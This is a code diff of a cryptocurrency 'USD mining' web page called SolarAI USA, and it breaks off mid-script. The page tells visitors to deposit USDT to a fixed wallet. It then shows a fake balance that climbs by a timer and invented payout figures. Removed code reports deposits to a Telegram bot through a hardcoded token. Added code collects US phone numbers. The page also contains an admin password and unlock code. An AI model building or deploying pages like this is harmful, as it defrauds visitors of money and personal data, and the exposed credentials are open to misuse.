@@ -9,195 +9,104 @@
 body{background:#0a0a0a;color:white;min-height:100vh;}
 .header{padding:20px;background:#111;border-bottom:1px solid #222;display:flex;justify-content:space-between;}
 .logo{font-weight:bold;font-size:18px;} .logo span{color:#00ff88;}
-.hero{padding:40px 20px;text-align:center;}
-.hero h1{font-size:32px;margin-bottom:10px;}
-.hero p{color:#888;margin-bottom:30px;}
+.hero{padding:30px 20px;text-align:center;}
+.hero h1{font-size:28px;margin-bottom:10px;}
 .card{background:#111;border:1px solid #222;border-radius:16px;padding:24px;margin:20px;max-width:500px;margin-left:auto;margin-right:auto;}
-.balance{font-size:14px;color:#888;}
-.amount{font-size:42px;font-weight:bold;margin:10px 0;color:#00ff88;}
-.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer;transition:0.3s;}
-.btn:disabled{background:#333 !important;color:#666 !important;cursor:not-allowed !important;}
+.btn{width:100%;padding:16px;background:white;color:black;border:none;border-radius:12px;font-weight:bold;font-size:16px;margin-top:15px;cursor:pointer;}
+.btn:disabled{background:#333 !important;color:#666 !important;}
 .btn-green{background:#00ff88 !important;}
 .btn-outline{background:transparent !important;color:white !important;border:1px solid #333 !important;}
-.stats{display:flex;justify-content:space-between;margin-top:20px;gap:10px;}
-.stat{background:#1a1a1a;padding:15px;border-radius:12px;flex:1;text-align:center;}
-.stat b{display:block;font-size:18px;margin-bottom:5px;}
-.stat small{color:#888;font-size:12px;}
-.badge{display:inline-block;background:#00ff8820;color:#00ff88;padding:6px 12px;border-radius:20px;font-size:12px;margin-bottom:20px;border:1px solid #00ff8840;}
 .walletBox{background:#000;border:1px dashed #00ff88;padding:12px;border-radius:10px;word-break:break-all;font-size:13px;color:#00ff88;margin:10px 0;text-align:center;}
-.depositBtns{display:flex;gap:8px;margin-top:15px;}
-.depositBtns button{flex:1;padding:12px;background:#1a1a1a;border:1px solid #333;color:white;border-radius:10px;font-weight:bold;cursor:pointer;}
-.depositBtns button:hover,.depositBtns button.active{border-color:#00ff88;color:#00ff88;background:#00ff8815;}
-.network{font-size:11px;color:#ffaa00;background:#ffaa0015;padding:4px 8px;border-radius:6px;display:inline-block;margin-top:5px;}
+.input{width:100%;padding:14px;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:white;font-size:16px;margin-top:10px;}
+.input:focus{border-color:#00ff88;outline:none;}
 .qrBox{background:white;padding:12px;border-radius:12px;display:flex;justify-content:center;margin:15px auto;width:180px;height:180px;}
-.lockMsg{background:#ffaa0015;border:1px solid #ffaa0030;color:#ffaa00;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
-.unlockedMsg{background:#00ff8815;border:1px solid #00ff8830;color:#00ff88;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
-.pendingMsg{background:#0088ff15;border:1px solid #0088ff30;color:#0088ff;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;}
+.badge{display:inline-block;background:#00ff8820;color:#00ff88;padding:6px 12px;border-radius:20px;font-size:12px;margin-bottom:15px;border:1px solid #00ff8840;}
+.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:flex;justify-content:center;align-items:center;z-index:9999;padding:20px;}
+.modalCard{background:#111;border:1px solid #00ff88;border-radius:16px;padding:24px;max-width:400px;width:100%;}
+.flag{font-size:18px;}
 </style>
 </head>
 <body>
+<!-- REGISTRATION MODAL - USA PHONE -->
+<div class="modal" id="regModal">
+<div class="modalCard">
+<div style="text-align:center;">
+<div class="badge">🇺🇸 USA ONLY</div>
+<h2 style="margin-bottom:5px;">Register to Mine USD</h2>
+<p style="color:#888;font-size:13px;margin-bottom:15px;">USA telephone number required</p>
+</div>
+
+<div id="step1">
+<label style="font-size:12px;color:#888;">USA Phone Number (+1)</label>
+<div style="display:flex;gap:8px;margin-top:5px;">
+<div style="padding:14px;background:#1a1a1a;border:1px solid #333;border-radius:10px;">🇺🇸 +1</div>
+<input class="input" id="phoneInput" placeholder="202-555-0123" type="tel" maxlength="14" style="margin-top:0;flex:1;">
+</div>
+<div style="font-size:11px;color:#666;margin-top:8px;">Format: +1 (10 digits) - Example: +1 2025550123</div>
+<button class="btn btn-green" onclick="sendCode()">📲 SEND VERIFICATION CODE</button>
+<div style="font-size:11px;color:#ffaa00;margin-top:10px;text-align:center;">⚠️ Only USA numbers allowed (+1). Code valid 5 mins.</div>
+</div>
+
+<div id="step2" style="display:none;">
+<label style="font-size:12px;color:#888;">Enter 6-digit code sent to <span id="phoneDisplay"></span></label>
+<input class="input" id="codeInput" placeholder="123456" type="number" maxlength="6">
+<div id="codeHint" style="font-size:11px;color:#00ff88;margin-top:8px;text-align:center;"></div>
+<button class="btn btn-green" onclick="verifyCode()">✅ VERIFY & ACTIVATE MINING</button>
+<button class="btn btn-outline" onclick="backToStep1()">← Change Number</button>
+<div style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Didn't get code? <a href="#" onclick="resendCode()" style="color:#00ff88;">Resend</a></div>
+</div>
+
+</div>
+</div>
+
 <div class="header">
-<div class="logo">⚡ <span>SolarAI</span> USA</div>
+<div class="logo">⚡ <span>SolarAI</span> USA <span id="userPhone" style="font-size:11px;color:#00ff88;margin-left:10px;"></span></div>
 <div style="font-size:12px;color:#00ff88;">● LIVE</div>
 </div>
+
 <div class="hero">
 <div class="badge">🇺🇸 USA Dollar Mining Active</div>
 <h1>Mine USD Daily</h1>
-<p>Your solar-powered dollar mining bot is live</p>
+<p style="color:#888;font-size:13px;" id="welcomeText">Register with USA number to start</p>
 </div>
 
-<div class="card" style="border-color:#00ff8840;">
-<div class="balance">💰 Deposit - USDT (TRC20) Only</div>
-<div style="font-size:13px;color:#888;margin-top:5px;">Minimum: $50 to Activate</div>
-<div class="qrBox">
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" alt="QR">
-</div>
+<div class="card" style="border-color:#00ff8840;" id="depositCard">
+<div style="font-size:14px;color:#888;">💰 Deposit - USDT (TRC20)</div>
+<div class="qrBox"><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra"></div>
 <div class="walletBox">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</div>
-<center><div class="network">⚠️ TRON TRC20 Only - Min $50</div></center>
-<div class="depositBtns">
-<button onclick="selectDeposit(50)" id="btn50">$50<br><small>STARTER</small></button>
-<button onclick="selectDeposit(500)" id="btn500">$500<br><small>PRO</small></button>
-<button onclick="selectDeposit(5000)" id="btn5000">$5000<br><small>VIP</small></button>
-</div>
-<button class="btn btn-green" onclick="copyWallet()">📋 COPY WALLET ADDRESS</button>
-<button class="btn btn-outline" id="sentBtn" onclick="confirmDeposit()">✅ I HAVE SENT USDT (TRC20)</button>
-<div id="depositStatus" style="font-size:11px;color:#666;margin-top:10px;text-align:center;">Send $50+ USDT TRC20 to unlock mining</div>
+<button class="btn btn-green" onclick="copyWallet()">📋 COPY WALLET</button>
+<button class="btn btn-outline" id="sentBtn" onclick="confirmDeposit()">✅ I HAVE SENT $50+ USDT</button>
+<div style="font-size:10px;color:#666;margin-top:8px;text-align:center;">Min $50 TRC20 to unlock mining | Balance saves permanently</div>
 </div>
 
 <div class="card">
-<div class="balance">Total Mined Balance</div>
-<div class="amount" id="balance">$0.00</div>
-<div style="color:#888;font-size:13px;" id="speedText">Speed: LOCKED - Deposit First</div>
-<button class="btn" id="mineBtn" onclick="mine()" disabled>🔒 DEPOSIT $50 TO START MINING</button>
-<div id="lockMessage" class="lockMsg">🔒 Mining Locked<br>Deposit $50 USDT (TRC20) to wallet above. After admin verification, mining unlocks automatically. Balance saves permanently until withdrawal.</div>
-<div id="pendingMessage" class="pendingMsg" style="display:none;">⏳ Deposit Pending Admin Verification<br>We received your request. Admin will verify on Tronscan and activate mining in 5-10 mins. Keep this page open.</div>
-<div id="unlockMessage" class="unlockedMsg" style="display:none;">✅ Mining Activated by Admin!<br>Your deposit verified. Mining at $0.12/sec. Balance saved forever until you withdraw.</div>
-<button class="btn btn-green" onclick="withdraw()">💵 WITHDRAW USD (Min $50)</button>
-<div class="stats">
-<div class="stat"><b>1,248</b><small>Active</small></div>
-<div class="stat"><b>$4.2M</b><small>Paid</small></div>
-<div class="stat"><b>USA</b><small>Region</small></div>
-</div>
-<div style="text-align:center;margin-top:20px;">
-<a href="#" onclick="adminLogin()" style="color:#333;font-size:10px;text-decoration:none;">Admin</a>
-</div>
+<div style="font-size:14px;color:#888;">Total Mined Balance</div>
+<div style="font-size:42px;font-weight:bold;margin:10px 0;color:#00ff88;" id="balance">$0.00</div>
+<div style="color:#888;font-size:13px;" id="speedText">Speed: LOCKED - Register First</div>
+<button class="btn" id="mineBtn" onclick="mine()" disabled>🔒 REGISTER WITH USA NUMBER FIRST</button>
+<div id="statusMsg" style="background:#ffaa0015;border:1px solid #ffaa0030;color:#ffaa00;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-top:15px;">Step 1: Register USA Phone → Step 2: Deposit $50 USDT TRC20 → Step 3: Mine $0.12/sec</div>
+<button class="btn btn-green" onclick="withdraw()">💵 WITHDRAW (Min $50)</button>
+<div style="text-align:center;margin-top:10px;"><a href="#" onclick="adminLogin()" style="color:#222;font-size:10px;">Admin</a></div>
 </div>
 
 <script>
 const DEPOSIT_WALLET = "TATeM34UJsHhnADWrjemiYXdrHiyuPrFra";
-const ADMIN_PASSWORD = "SolarAI2024"; // Change this!
-const MIN_DEPOSIT = 50;
-const MIN_WITHDRAW = 50;
-
-let selectedAmount = 50;
-let bal = parseFloat(localStorage.getItem('solarai_balance') || '0');
-let mining = localStorage.getItem('solarai_mining') === 'true';
+const ADMIN_PASSWORD = "SolarAI2024";
+const ADMIN_UNLOCK_CODE = "TATeAdmin2024";
+let generatedCode = "";
+let userPhone = localStorage.getItem('solarai_phone') || "";
+let isVerified = localStorage.getItem('solarai_verified') === 'true';
 let isDeposited = localStorage.getItem('solarai_deposited') === 'true';
-let isPending = localStorage.getItem('solarai_pending') === 'true';
+let bal = parseFloat(localStorage.getItem('solarai_balance') || '0');
+let mining = false;
 let miningInterval = null;
 
 window.onload = function(){
-  // Restore balance - NEVER goes to zero unless withdrawn
   document.getElementById('balance').innerText = '$' + bal.toFixed(2);
-  if(bal > 0 || isDeposited){
-    unlockMining();
-    if(mining) startMiningLoop();
-  }
-  if(isPending){
-    showPending();
-  }
-  selectDeposit(50);
-  
-  // Check URL for admin unlock ?admin_unlock=CODE
-  const urlParams = new URLSearchParams(window.location.search);
-  if(urlParams.get('unlock') === 'TATeAdmin2024'){
-    unlockMining();
-    alert("✅ ADMIN UNLOCKED YOUR MINING!");
-  }
-};
-
-function saveBalance(){
-  localStorage.setItem('solarai_balance', bal.toString());
-  document.getElementById('balance').innerText = '$' + bal.toFixed(2);
-}
-
-function unlockMining(){
-  isDeposited = true;
-  isPending = false;
-  localStorage.setItem('solarai_deposited','true');
-  localStorage.removeItem('solarai_pending');
-  document.getElementById('mineBtn').disabled = false;
-  document.getElementById('mineBtn').innerText = '⚡ START MINING';
-  document.getElementById('speedText').innerText = 'Speed: $0.12 / sec - ACTIVE';
-  document.getElementById('speedText').style.color = '#00ff88';
-  document.getElementById('lockMessage').style.display = 'none';
-  document.getElementById('pendingMessage').style.display = 'none';
-  document.getElementById('unlockMessage').style.display = 'block';
-}
-
-function showPending(){
-  document.getElementById('mineBtn').disabled = true;
-  document.getElementById('mineBtn').innerText = '⏳ WAITING FOR ADMIN VERIFICATION';
-  document.getElementById('lockMessage').style.display = 'none';
-  document.getElementById('pendingMessage').style.display = 'block';
-  document.getElementById('depositStatus').innerHTML = "⏳ Pending verification by admin...<br>Will auto-unlock after Tronscan check";
-}
-
-function selectDeposit(amt){
-  if(amt < MIN_DEPOSIT) return;
-  selectedAmount = amt;
-  document.querySelectorAll('.depositBtns button').forEach(b=>b.classList.remove('active'));
-  document.getElementById('btn'+amt)?.classList.add('active');
-}
-
-function copyWallet(){
-  navigator.clipboard.writeText(DEPOSIT_WALLET);
-  alert("✅ Copied: " + DEPOSIT_WALLET);
-}
-
-function confirmDeposit(){
-  if(selectedAmount < MIN_DEPOSIT){
-    alert("❌ Minimum $50");
-    return;
-  }
-  let tx = prompt(`💰 Deposit $${selectedAmount} USDT (TRC20)\nWallet: ${DEPOSIT_WALLET}\n\nEnter TX Hash (required for admin verification):`);
-  if(!tx || tx.length < 5){
-    alert("❌ Please enter TX Hash from TronScan after sending");
-    return;
-  }
-  let token = "8940541573:AAFjScGdvW-W2NbjdPC78ooxIBNENqkQSjE";
-  let chatId = "1884572429";
-  let text = `💰 NEW DEPOSIT PENDING VERIFICATION\n\n💵 Amount: $${selectedAmount} USDT (TRC20)\n📥 To: ${DEPOSIT_WALLET}\n🔗 TX: ${tx}\n⏰ ${new Date().toLocaleString()}\n🌐 solarai-capital-usa.vercel.app\n\n🔑 ADMIN: To auto-unlock user, send them: https://solarai-capital-usa.vercel.app?unlock=TATeAdmin2024\nOr enter admin password on their device.`;
-  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-  
-  isPending = true;
-  localStorage.setItem('solarai_pending','true');
-  localStorage.setItem('solarai_pending_amount', selectedAmount.toString());
-  localStorage.setItem('solarai_pending_tx', tx);
-  showPending();
-  alert(`✅ Deposit Submitted for Admin Verification!\n\nAmount: $${selectedAmount}\nTX: ${tx}\n\n⏳ Status: PENDING\nAdmin will verify on Tronscan and unlock your mining in 5-10 mins.\n\nYou will get auto-unlock. Balance will NOT reset until withdrawal.`);
-}
-
-function startMiningLoop(){
-  if(miningInterval) clearInterval(miningInterval);
-  miningInterval = setInterval(()=>{
-    bal += 0.12 + Math.random()*0.05;
-    saveBalance();
-  },200);
-}
-
-function mine(){
-  if(!isDeposited){
-    alert("🔒 Locked! Deposit $50 first.");
-    return;
-  }
-  if(mining) return;
-  mining = true;
-  localStorage.setItem('solarai_mining','true');
-  document.getElementById('mineBtn').innerText = '⛏️ MINING... $0.12/sec';
-  startMiningLoop();
-}
-
-function withdraw(){
-  if(!isDeposited){
-    alert("🔒 Deposit
+  if(userPhone && isVerified){
+    document.getElementById('regModal').style.display = 'none';
+    document.getElementById('userPhone').innerText = userPhone;
+    document.getElementById('welcomeText').innerText = 'Welcome ' + userPhone + ' - Verified USA Miner';
+    if(isDeposited){
+      unlockMining();
+      if  
